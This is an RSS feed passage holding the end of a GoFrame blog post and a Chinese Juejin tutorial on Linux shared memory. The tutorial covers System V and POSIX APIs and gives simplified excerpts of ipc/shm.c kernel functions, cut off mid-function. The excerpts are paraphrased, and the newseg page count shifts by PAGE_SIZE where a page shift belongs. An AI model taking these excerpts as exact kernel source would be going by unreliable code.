<li>下期想我拆解 GoFrame 的哪个功能？（比如权限控制、微服务部署、日志排查）</li>
</ol>
<p>关注我，后续持续输出 GoFrame 实战干货、PHP 转 Go 避坑指南，还有商业项目中的真实案例拆解，帮你快速从 "Go 新手" 熬成 "Go 熟手"💪</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linux 共享内存详解]]></title>    <link>https://juejin.cn/post/7584059298696282153</link>    <guid>https://juejin.cn/post/7584059298696282153</guid>    <pubDate>2025-12-16T07:28:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584059298696282153" data-draft-id="7584007232411680774" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linux 共享内存详解"/> <meta itemprop="keywords" content="嵌入式"/> <meta itemprop="datePublished" content="2025-12-16T07:28:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Shawn_CH"/> <meta itemprop="url" content="https://juejin.cn/user/4074114702122217"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linux 共享内存详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4074114702122217/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Shawn_CH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:28:06.000Z" title="Tue Dec 16 2025 07:28:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读25分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 概述</h2>
<h3 data-id="heading-1">1.1 什么是共享内存？</h3>
<p><strong>共享内存的定义</strong>：</p>
<p>共享内存（Shared Memory）是一种进程间通信（IPC）机制，允许多个进程访问同一块物理内存区域。这是最快的 IPC 方式，因为数据不需要在内核和用户空间之间复制。</p>
<p><strong>共享内存的特点</strong>：</p>
<ol>
<li><strong>高性能</strong>：数据直接映射到进程地址空间，无需复制</li>
<li><strong>低延迟</strong>：访问速度接近直接内存访问</li>
<li><strong>大容量</strong>：可以共享大量数据</li>
<li><strong>持久性</strong>：数据在进程退出后仍然存在（直到显式删除）</li>
</ol>
<p><strong>共享内存的用途</strong>：</p>
<ol>
<li><strong>高性能数据传输</strong>：进程间大量数据交换</li>
<li><strong>数据库系统</strong>：共享缓存和缓冲区</li>
<li><strong>图形系统</strong>：共享图形缓冲区</li>
<li><strong>科学计算</strong>：共享计算结果</li>
</ol>
<h3 data-id="heading-2">1.2 Linux 中的共享内存类型</h3>
<p>Linux 提供了两种主要的共享内存机制：</p>
<ol>
<li>
<p><strong>System V 共享内存</strong>：</p>
<ul>
<li><strong>API</strong>：<code>shmget()</code>, <code>shmat()</code>, <code>shmdt()</code>, <code>shmctl()</code></li>
<li><strong>特点</strong>：传统的 IPC 机制，基于键值（key）</li>
<li><strong>实现</strong>：基于 <code>tmpfs</code> 文件系统</li>
</ul>
</li>
<li>
<p><strong>POSIX 共享内存</strong>：</p>
<ul>
<li><strong>API</strong>：<code>shm_open()</code>, <code>shm_unlink()</code>, <code>mmap()</code></li>
<li><strong>特点</strong>：POSIX 标准，基于文件名</li>
<li><strong>实现</strong>：基于 <code>tmpfs</code> 文件系统（通常挂载在 <code>/dev/shm</code>）</li>
</ul>
</li>
<li>
<p><strong>内存映射文件（mmap）</strong>：</p>
<ul>
<li><strong>API</strong>：<code>mmap()</code>, <code>munmap()</code></li>
<li><strong>特点</strong>：可以映射文件或匿名内存</li>
<li><strong>实现</strong>：直接内存映射</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">1.3 共享内存与普通内存的区别</h3>






























<table><thead><tr><th>特性</th><th>普通内存</th><th>共享内存</th></tr></thead><tbody><tr><td><strong>可见性</strong></td><td>仅当前进程可见</td><td>多个进程可见</td></tr><tr><td><strong>生命周期</strong></td><td>进程退出时释放</td><td>显式删除或系统重启</td></tr><tr><td><strong>访问方式</strong></td><td>直接访问</td><td>需要先 attach</td></tr><tr><td><strong>同步</strong></td><td>不需要</td><td>需要同步机制（信号量、锁等）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">2. System V 共享内存</h2>
<h3 data-id="heading-5">2.1 System V 共享内存 API</h3>
<p><strong>核心系统调用</strong>：</p>
<ol>
<li><strong><code>shmget()</code></strong>：创建或获取共享内存段</li>
<li><strong><code>shmat()</code></strong>：将共享内存段附加到进程地址空间</li>
<li><strong><code>shmdt()</code></strong>：从进程地址空间分离共享内存段</li>
<li><strong><code>shmctl()</code></strong>：控制共享内存段（获取信息、设置权限、删除等）</li>
</ol>
<p><strong>函数原型</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span>

<span class="hljs-comment">// 创建或获取共享内存段</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shmget</span><span class="hljs-params">(<span class="hljs-type">key_t</span> key, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> shmflg)</span>;

<span class="hljs-comment">// 附加共享内存段到进程地址空间</span>
<span class="hljs-type">void</span> *<span class="hljs-title function_">shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *shmaddr, <span class="hljs-type">int</span> shmflg)</span>;

<span class="hljs-comment">// 从进程地址空间分离共享内存段</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shmdt</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *shmaddr)</span>;

<span class="hljs-comment">// 控制共享内存段</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">shmctl</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">int</span> cmd, <span class="hljs-keyword">struct</span> shmid_ds *buf)</span>;
</code></pre>
<h3 data-id="heading-6">2.2 shmget() 的实现原理</h3>
<p><strong>shmget() 的作用</strong>：</p>
<p>创建新的共享内存段或获取已存在的共享内存段的标识符。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
SYSCALL_DEFINE3(shmget, <span class="hljs-type">key_t</span>, key, <span class="hljs-type">size_t</span>, size, <span class="hljs-type">int</span>, shmflg)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>
    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_ops</span> <span class="hljs-title">shm_ops</span> =</span> {
        .getnew = newseg,  <span class="hljs-comment">// 创建新段</span>
        .associate = security_shm_associate,
        .more_checks = shm_more_checks,
    };
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_params</span> <span class="hljs-title">shm_params</span>;</span>
    
    ns = current-&gt;nsproxy-&gt;ipc_ns;
    
    shm_params.key = key;
    shm_params.flg = shmflg;
    shm_params.u.size = size;
    
    <span class="hljs-keyword">return</span> ipcget(ns, &amp;shm_ids(ns), &amp;shm_ops, &amp;shm_params);
}
</code></pre>
<p><strong>newseg() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">newseg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ipc_namespace *ns, <span class="hljs-keyword">struct</span> ipc_params *params)</span>
{
    <span class="hljs-type">key_t</span> key = params-&gt;key;
    <span class="hljs-type">int</span> shmflg = params-&gt;flg;
    <span class="hljs-type">size_t</span> size = params-&gt;u.size;
    <span class="hljs-type">int</span> error;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-type">size_t</span> numpages = (size + PAGE_SIZE - <span class="hljs-number">1</span>) &gt;&gt; PAGE_SIZE;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">12</span>];
    <span class="hljs-type">int</span> id;
    <span class="hljs-type">void</span> *user_memory;
    
    <span class="hljs-comment">// 1. 检查大小限制</span>
    <span class="hljs-keyword">if</span> (size &lt; SHMMIN || size &gt; ns-&gt;shm_ctlmax)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-comment">// 2. 分配 shmid_kernel 结构</span>
    shp = kvmalloc(<span class="hljs-keyword">sizeof</span>(*shp), GFP_KERNEL);
    <span class="hljs-keyword">if</span> (!shp)
        <span class="hljs-keyword">return</span> -ENOMEM;
    
    <span class="hljs-comment">// 3. 创建 tmpfs 文件</span>
    <span class="hljs-built_in">sprintf</span>(name, <span class="hljs-string">"SYSV%08x"</span>, key);
    file = shmem_kernel_file_setup(name, size, acctflag);
    <span class="hljs-keyword">if</span> (IS_ERR(file)) {
        error = PTR_ERR(file);
        <span class="hljs-keyword">goto</span> no_file;
    }
    
    <span class="hljs-comment">// 4. 初始化 shmid_kernel 结构</span>
    shp-&gt;shm_file = file;
    shp-&gt;shm_perm.key = key;
    shp-&gt;shm_perm.mode = (shmflg &amp; S_IRWXUGO);
    shp-&gt;shm_perm.security = <span class="hljs-literal">NULL</span>;
    shp-&gt;shm_segsz = size;
    shp-&gt;shm_nattch = <span class="hljs-number">0</span>;
    shp-&gt;shm_atim = <span class="hljs-number">0</span>;
    shp-&gt;shm_dtim = <span class="hljs-number">0</span>;
    shp-&gt;shm_ctim = ktime_get_real_seconds();
    shp-&gt;shm_cprid = get_pid(task_tgid(current));
    shp-&gt;shm_lprid = <span class="hljs-literal">NULL</span>;
    shp-&gt;shm_ns = ns;
    
    <span class="hljs-comment">// 5. 注册到 IPC 命名空间</span>
    id = ipc_addid(&amp;shm_ids(ns), &amp;shp-&gt;shm_perm, ns-&gt;shm_ctlmni);
    <span class="hljs-keyword">if</span> (id &lt; <span class="hljs-number">0</span>) {
        error = id;
        <span class="hljs-keyword">goto</span> no_id;
    }
    
    <span class="hljs-comment">// 6. 更新命名空间统计</span>
    ns-&gt;shm_tot += numpages;
    
    <span class="hljs-keyword">return</span> id;
}
</code></pre>
<p><strong>关键步骤说明</strong>：</p>
<ol>
<li>
<p><strong>大小检查</strong>：</p>
<ul>
<li><strong>SHMMIN</strong>：最小共享内存段大小（通常 1 字节）</li>
<li><strong>shm_ctlmax</strong>：最大共享内存段大小（可通过 <code>sysctl</code> 配置）</li>
</ul>
</li>
<li>
<p><strong>创建 tmpfs 文件</strong>：</p>
<ul>
<li><strong><code>shmem_kernel_file_setup()</code></strong>：在 tmpfs 文件系统中创建文件</li>
<li><strong>文件名</strong>：<code>SYSV</code> + 8 位十六进制 key</li>
<li><strong>作用</strong>：共享内存段实际上是一个 tmpfs 文件</li>
</ul>
</li>
<li>
<p><strong>初始化结构</strong>：</p>
<ul>
<li><strong><code>shmid_kernel</code></strong>：内核中的共享内存段结构</li>
<li><strong><code>shm_perm</code></strong>：IPC 权限结构</li>
<li><strong><code>shm_file</code></strong>：指向 tmpfs 文件的指针</li>
</ul>
</li>
<li>
<p><strong>注册到 IPC 命名空间</strong>：</p>
<ul>
<li><strong><code>ipc_addid()</code></strong>：分配唯一的共享内存 ID</li>
<li><strong>作用</strong>：将共享内存段添加到命名空间的 ID 表中</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">2.3 shmat() 的实现原理</h3>
<p><strong>shmat() 的作用</strong>：</p>
<p>将共享内存段附加到调用进程的地址空间，返回映射的虚拟地址。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">long</span> <span class="hljs-title function_">do_shmat</span><span class="hljs-params">(<span class="hljs-type">int</span> shmid, <span class="hljs-type">char</span> __user *shmaddr, <span class="hljs-type">int</span> shmflg, ulong *raddr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> shmlba)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)shmaddr;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span>
    <span class="hljs-type">int</span>    err;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags = MAP_SHARED;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> prot;
    <span class="hljs-type">int</span> acc_mode;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span>;</span>
    <span class="hljs-type">int</span> f_flags;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> populate = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 1. 获取共享内存段</span>
    ns = current-&gt;nsproxy-&gt;ipc_ns;
    shp = shm_obtain_object_check(ns, shmid);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 2. 检查权限</span>
    err = -EACCES;
    <span class="hljs-keyword">if</span> (ipcperms(ns, &amp;shp-&gt;shm_perm, acc_mode))
        <span class="hljs-keyword">goto</span> out_unlock;
    
    <span class="hljs-comment">// 3. 检查大小</span>
    err = -EINVAL;
    size = i_size_read(file_inode(shp-&gt;shm_file));
    <span class="hljs-keyword">if</span> (size &lt; SHMMIN || size &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ns-&gt;shm_ctlmax)
        <span class="hljs-keyword">goto</span> out_unlock;
    
    <span class="hljs-comment">// 4. 创建 shm_file_data 结构</span>
    sfd = kvmalloc(<span class="hljs-keyword">sizeof</span>(*sfd), GFP_KERNEL);
    <span class="hljs-keyword">if</span> (!sfd) {
        err = -ENOMEM;
        <span class="hljs-keyword">goto</span> out_unlock;
    }
    
    file = alloc_file_clone(shp-&gt;shm_file, f_flags,
                            is_file_hugepages(shp-&gt;shm_file) ?
                            &amp;shm_file_operations_huge :
                            &amp;shm_file_operations);
    <span class="hljs-keyword">if</span> (IS_ERR(file)) {
        err = PTR_ERR(file);
        <span class="hljs-keyword">goto</span> out_freed;
    }
    
    sfd-&gt;id = shp-&gt;shm_perm.id;
    sfd-&gt;ns = get_ipc_ns(ns);
    sfd-&gt;file = shp-&gt;shm_file;
    sfd-&gt;vm_ops = <span class="hljs-literal">NULL</span>;
    file-&gt;private_data = sfd;
    
    <span class="hljs-comment">// 5. 执行内存映射</span>
    err = do_mmap_pgoff(file, addr, size, prot, flags, <span class="hljs-number">0</span>, &amp;populate, <span class="hljs-literal">NULL</span>);
    *raddr = addr;
    
    <span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) {
        fput(file);
        <span class="hljs-keyword">goto</span> out_nattch;
    }
    
    <span class="hljs-comment">// 6. 更新统计信息</span>
    shp-&gt;shm_nattch++;
    shp-&gt;shm_atim = ktime_get_real_seconds();
    ipc_update_pid(&amp;shp-&gt;shm_lprid, task_tgid(current));
    
    <span class="hljs-keyword">return</span> err;
}
</code></pre>
<p><strong>关键步骤说明</strong>：</p>
<ol>
<li>
<p><strong>获取共享内存段</strong>：</p>
<ul>
<li><strong><code>shm_obtain_object_check()</code></strong>：从 IPC 命名空间获取共享内存段</li>
<li><strong>检查</strong>：验证 ID 是否有效</li>
</ul>
</li>
<li>
<p><strong>权限检查</strong>：</p>
<ul>
<li><strong><code>ipcperms()</code></strong>：检查进程是否有权限访问共享内存段</li>
<li><strong>权限</strong>：读、写权限</li>
</ul>
</li>
<li>
<p><strong>创建文件描述符</strong>：</p>
<ul>
<li><strong><code>alloc_file_clone()</code></strong>：为共享内存段创建文件描述符</li>
<li><strong>作用</strong>：每个进程都有独立的文件描述符，但指向同一个文件</li>
</ul>
</li>
<li>
<p><strong>内存映射</strong>：</p>
<ul>
<li><strong><code>do_mmap_pgoff()</code></strong>：将文件映射到进程地址空间</li>
<li><strong>标志</strong>：<code>MAP_SHARED</code> 表示共享映射</li>
<li><strong>结果</strong>：返回映射的虚拟地址</li>
</ul>
</li>
<li>
<p><strong>更新统计</strong>：</p>
<ul>
<li><strong><code>shm_nattch</code></strong>：附加计数加 1</li>
<li><strong><code>shm_atim</code></strong>：更新最后附加时间</li>
<li><strong><code>shm_lprid</code></strong>：更新最后附加进程 ID</li>
</ul>
</li>
</ol>
<h3 data-id="heading-8">2.4 shm_mmap() 的实现原理</h3>
<p><strong>shm_mmap() 的作用</strong>：</p>
<p>当进程调用 <code>mmap()</code> 映射共享内存文件时，内核会调用 <code>shm_mmap()</code> 来处理映射。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">shm_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span> =</span> shm_file_data(file);
    <span class="hljs-type">int</span> ret;
    
    <span class="hljs-comment">// 1. 打开共享内存段（增加引用计数）</span>
    ret = __shm_open(vma);
    <span class="hljs-keyword">if</span> (ret)
        <span class="hljs-keyword">return</span> ret;
    
    <span class="hljs-comment">// 2. 调用底层文件的 mmap</span>
    ret = call_mmap(sfd-&gt;file, vma);
    <span class="hljs-keyword">if</span> (ret) {
        shm_close(vma);
        <span class="hljs-keyword">return</span> ret;
    }
    
    <span class="hljs-comment">// 3. 保存原始 vm_ops，替换为 shm_vm_ops</span>
    sfd-&gt;vm_ops = vma-&gt;vm_ops;
    vma-&gt;vm_ops = &amp;shm_vm_ops;
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>__shm_open() 函数</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> __shm_open(<span class="hljs-keyword">struct</span> vm_area_struct *vma)
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> vma-&gt;vm_file;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span> =</span> shm_file_data(file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    
    <span class="hljs-comment">// 1. 获取共享内存段</span>
    shp = shm_lock(sfd-&gt;ns, sfd-&gt;id);
    <span class="hljs-keyword">if</span> (IS_ERR(shp))
        <span class="hljs-keyword">return</span> PTR_ERR(shp);
    
    <span class="hljs-comment">// 2. 验证文件是否匹配</span>
    <span class="hljs-keyword">if</span> (shp-&gt;shm_file != sfd-&gt;file) {
        shm_unlock(shp);
        <span class="hljs-keyword">return</span> -EINVAL;  <span class="hljs-comment">// ID 被重用</span>
    }
    
    <span class="hljs-comment">// 3. 更新统计信息</span>
    shp-&gt;shm_atim = ktime_get_real_seconds();
    ipc_update_pid(&amp;shp-&gt;shm_lprid, task_tgid(current));
    shp-&gt;shm_nattch++;
    
    shm_unlock(shp);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>引用计数</strong>：每次映射时，<code>shm_nattch</code> 增加</li>
<li><strong>vm_ops 替换</strong>：将 VMA 的 <code>vm_ops</code> 替换为 <code>shm_vm_ops</code></li>
<li><strong>文件验证</strong>：确保文件没有被删除和重用</li>
</ol>
<h3 data-id="heading-9">2.5 shmdt() 的实现原理</h3>
<p><strong>shmdt() 的作用</strong>：</p>
<p>从进程地址空间分离共享内存段。</p>
<p><strong>内核实现</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
SYSCALL_DEFINE1(shmdt, <span class="hljs-type">char</span> __user *, shmaddr)
{
    <span class="hljs-keyword">return</span> ksys_shmdt(shmaddr);
}

<span class="hljs-type">long</span> <span class="hljs-title function_">ksys_shmdt</span><span class="hljs-params">(<span class="hljs-type">char</span> __user *shmaddr)</span>
{
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)shmaddr;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>, *<span class="hljs-title">next</span>;</span>
    <span class="hljs-type">int</span> retval = -EINVAL;
    
    <span class="hljs-comment">// 1. 查找包含该地址的 VMA</span>
    vma = find_vma(current-&gt;mm, addr);
    <span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-comment">// 2. 验证是否是共享内存映射</span>
    <span class="hljs-keyword">if</span> (vma-&gt;vm_ops != &amp;shm_vm_ops)
        <span class="hljs-keyword">return</span> -EINVAL;
    
    <span class="hljs-comment">// 3. 取消映射</span>
    size = vma-&gt;vm_end - vma-&gt;vm_start;
    retval = do_munmap(current-&gt;mm, addr, size, <span class="hljs-literal">NULL</span>);
    
    <span class="hljs-keyword">return</span> retval;
}
</code></pre>
<p><strong>shm_close() 函数</strong>：</p>
<p>当 VMA 被取消映射时，内核会调用 <code>shm_close()</code>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// ipc/shm.c</span>
<span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">shm_close</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> vma-&gt;vm_file;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> *<span class="hljs-title">sfd</span> =</span> shm_file_data(file);
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_kernel</span> *<span class="hljs-title">shp</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span> =</span> sfd-&gt;ns;
    
    down_write(&amp;shm_ids(ns).rwsem);
    
    <span class="hljs-comment">// 1. 获取共享内存段</span>
    shp = shm_lock(ns, sfd-&gt;id);
    <span class="hljs-keyword">if</span> (WARN_ON_ONCE(IS_ERR(shp)))
        <span class="hljs-keyword">goto</span> done;
    
    <span class="hljs-comment">// 2. 更新统计信息</span>
    ipc_update_pid(&amp;shp-&gt;shm_lprid, task_tgid(current));
    shp-&gt;shm_dtim = ktime_get_real_seconds();
    shp-&gt;shm_nattch--;
    
    <span class="hljs-comment">// 3. 检查是否需要销毁</span>
    <span class="hljs-keyword">if</span> (shm_may_destroy(shp))
        shm_destroy(ns, shp);
